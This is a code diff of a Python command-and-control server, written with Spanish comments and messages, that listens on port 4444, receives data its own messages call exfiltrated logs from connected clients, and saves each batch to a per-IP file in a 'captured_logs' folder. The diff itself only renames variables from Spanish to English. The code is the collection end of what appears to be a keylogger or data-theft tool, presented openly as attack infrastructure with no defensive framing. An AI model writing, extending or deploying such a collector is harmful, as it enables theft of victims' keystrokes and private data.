@@ -8,13 +8,13 @@ PORT = 4444
 def init_server():
     print(f"\n[+] Configurando el Servidor C2 en el puerto {PORT}...")
 
-    ruta_base = os.path.dirname(os.path.abspath(__file__))
-    ruta_proyecto = os.path.dirname(ruta_base)
-    carpeta_logs = os.path.join(ruta_proyecto, "captured_logs")
+    base_path = os.path.dirname(os.path.abspath(__file__))
+    path_proyect = os.path.dirname(base_path)
+    dir_logs = os.path.join(path_proyect, "captured_logs")
     
-    if not os.path.exists(carpeta_logs):
-        os.makedirs(carpeta_logs)
-        print(f"[*] Carpeta de logs creada en: {carpeta_logs}")
+    if not os.path.exists(dir_logs):
+        os.makedirs(dir_logs)
+        print(f"[*] Carpeta de logs creada en: {dir_logs}")
 
 
     # Create a TCP Socket
@@ -45,15 +45,15 @@ def init_server():
                 print("[*] Esperando exfiltración de datos...")
                 try:
                     # Aumentamos el tiempo de espera por si el log es grande
-                    datos_log = client_sock.recv(20480).decode('utf-8', errors='ignore')
+                    data_log = client_sock.recv(20480).decode('utf-8', errors='ignore')
                     
-                    if datos_log:
-                        nombre_archivo = f"log_{addr[0]}_{int(time.time())}.txt"
-                        ruta_completa = os.path.join(carpeta_logs, nombre_archivo)
+                    if data_log:
+                        file_name = f"log_{addr[0]}_{int(time.time())}.txt"
+                        path_complete = os.path.join(dir_logs, file_name)
                         
-                        with open(ruta_completa, "w", encoding="utf-8") as f:
-                            f.write(datos_log)
-                        print(f"\n[+] ¡ÉXITO! Log guardado en:\n    >> {ruta_completa}")
+                        with open(path_complete, "w", encoding="utf-8") as f:
+                            f.write(data_log)
+                        print(f"\n[+] ¡ÉXITO! Log guardado en:\n    >> {path_complete}")
                     else:
                         print("[-] El log llegó vacío.")
                         
